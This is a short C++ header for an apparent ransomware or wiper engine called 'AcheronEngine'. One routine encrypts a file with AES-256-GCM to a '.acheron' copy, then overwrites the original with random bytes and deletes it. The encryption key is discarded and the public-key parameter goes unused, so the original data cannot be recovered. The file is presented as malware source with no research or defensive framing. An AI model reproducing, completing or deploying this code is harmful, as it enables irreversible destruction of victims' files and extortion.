#ifndef ACHERONX_CORE_H
#define ACHERONX_CORE_H

#include <openssl/evp.h>
#include <openssl/rsa.h>
#include <openssl/pem.h>
#include <openssl/rand.h>
#include <vector>
#include <string>
#include <fstream>
#include <filesystem>

namespace fs = std::filesystem;

class AcheronEngine {
public:
    static void Shred(const std::string& path) {
        if (!fs::exists(path)) return;
        std::uintmax_t size = fs::file_size(path);
        std::ofstream wipe(path, std::ios::binary | std::ios::in | std::ios::out);
        std::vector<unsigned char> buf(65536);
        for (std::uintmax_t i = 0; i < size; i += buf.size()) {
            RAND_bytes(buf.data(), buf.size());
            wipe.write((char*)buf.data(), std::min((std::uintmax_t)buf.size(), size - i));
        }
        wipe.flush(); wipe.close();
        fs::remove(path);
    }

    static bool Encrypt(const std::string& in_p, const std::string& pub_key_pem) {
        unsigned char key[32], iv[12], tag[16];
        RAND_bytes(key, 32); RAND_bytes(iv, 12);

        std::ifstream in(in_p, std::ios::binary);
        std::ofstream out(in_p + ".acheron", std::ios::binary);
        
        EVP_CIPHER_CTX* ctx = EVP_CIPHER_CTX_new();
        EVP_EncryptInit_ex(ctx, EVP_aes_256_gcm(), NULL, key, iv);
        
        unsigned char in_b[65536], out_b[65536 + 16];
        int len;
        out.write((char*)iv, 12);

        while (in.read((char*)in_b, sizeof(in_b)) || in.gcount() > 0) {
            EVP_EncryptUpdate(ctx, out_b, &len, in_b, (int)in.gcount());
            out.write((char*)out_b, len);
        }
        EVP_EncryptFinal_ex(ctx, out_b, &len);
        EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_GET_TAG, 16, tag);
        out.write((char*)tag, 16);

        EVP_CIPHER_CTX_free(ctx);
        in.close(); out.close();
        OPENSSL_cleanse(key, 32);
        Shred(in_p);
        return true;
    }
};
#endif
